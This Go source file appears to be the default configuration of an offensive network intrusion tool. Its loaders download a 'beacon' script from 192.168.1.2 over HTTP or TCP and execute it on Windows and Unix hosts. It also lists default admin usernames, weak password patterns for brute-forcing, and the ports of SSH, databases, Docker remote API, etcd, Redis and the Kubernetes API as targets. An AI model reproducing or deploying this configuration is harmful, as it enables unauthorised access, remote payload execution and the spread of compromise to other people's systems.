package common

var DefaultDownloader = Downloader{
	WinHTTP: Loader{
		Addr:        "http://192.168.1.2:8080/beacon.bat",
		FileName:    "beacon.bat",
		ExecCommand: "beacon.bat",
	},
	UnixHTTP: Loader{
		Addr:        "http://192.168.1.2:8080/beacon.sh",
		FileName:    "beacon.sh",
		ExecCommand: "beacon.sh",
	},
	UnixTCP: Loader{
		Addr:        "192.168.1.2:8553/beacon.sh",
		FileName:    "beacon.sh",
		ExecCommand: "beacon.sh",
	},
}

var Userdict = map[string][]string{
	"mysql":      {"root"},
	"ssh":        {"root"},
	"mssql":      {"sa"},
	"postgresql": {"postgres"},
}

var Passwords = []string{"123456", "{user}", "{user}@123"}

var PortList = map[string]string{
	"ssh":           "22",
	"mssql":         "1433",
	"docker-remote": "2375",
	"etcd":          "2379",
	"mysql":         "3306",
	"postgresql":    "5432",
	"redis":         "6379",
	"kube-api":      "6443",
}
